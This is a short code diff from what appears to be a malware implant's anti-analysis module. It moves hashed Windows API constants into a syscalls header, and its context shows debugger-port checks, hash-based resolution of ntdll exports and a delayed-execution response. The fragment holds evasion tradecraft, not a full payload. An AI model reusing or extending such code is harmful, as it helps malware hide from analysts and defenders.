@@ -9,6 +9,7 @@
 #include "specter.h"
 #include "ntdefs.h"
 #include "peb.h"
+#include "syscalls.h"
 #include "antianalysis.h"
 
 /* HASH_USER32_DLL defined in evasion.h — avoid including full header to
@@ -790,7 +791,7 @@ static DWORD aa_check_debug_port(IMPLANT_CONTEXT *ctx,
     PVOID ntdll = find_module_by_hash(HASH_NTDLL_DLL);
     if (!ntdll) return 0;
 
-    #define HASH_NTQUERYINFORMATIONPROCESS 0x8CDFAC24
+    /* HASH_NTQUERYINFORMATIONPROCESS provided by syscalls.h */
     #define PROCESS_DEBUG_PORT 7
 
     PFN_NTQIP pNtQIP = (PFN_NTQIP)find_export_by_hash(ntdll,
@@ -1004,7 +1005,7 @@ void antianalysis_respond(IMPLANT_CONTEXT *ctx, ANALYSIS_RESPONSE response) {
         PVOID ntdll = find_module_by_hash(HASH_NTDLL_DLL);
         if (!ntdll) return;
 
-        #define HASH_NTDELAYEXECUTION 0xF5A3B2C1
+        /* HASH_NTDELAYEXECUTION provided by syscalls.h */
         PFN_NTDELAY pDelay =
             (PFN_NTDELAY)find_export_by_hash(ntdll, HASH_NTDELAYEXECUTION);
         if (!pDelay) return;
